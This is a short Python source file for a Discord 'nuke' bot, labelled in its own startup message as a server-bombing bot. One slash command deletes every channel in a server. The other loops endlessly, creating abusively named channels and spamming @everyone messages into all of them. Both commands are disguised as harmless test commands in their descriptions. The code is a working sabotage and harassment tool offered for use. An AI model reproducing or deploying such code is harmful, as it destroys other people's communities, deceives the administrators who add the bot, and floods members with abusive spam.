import discord
from discord.ext import commands
from discord.commands import slash_command


intents = discord.Intents().all()
bot = commands.Bot(command_prefix='!',intents = intents)

@bot.event
async def on_ready():
    print(f"您的炸群機器人{bot.user}已準備")
    print("**請使用/cleaer刪除所有頻道   /boom_server炸群**")


@bot.slash_command(description="早安阿這是測試指令1")
async def cleaer(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.slash_command(description="晚安這是測試指令2")
async def boom_server(ctx):
    while True:
        await ctx.guild.create_text_channel(name="淦-垃圾群組")
        for channel in ctx.guild.channels:
            await channel.send("# @everyone 放煙火咯 🧨🧨🧨 淦垃圾群組就是要被炸")

bot.run("")
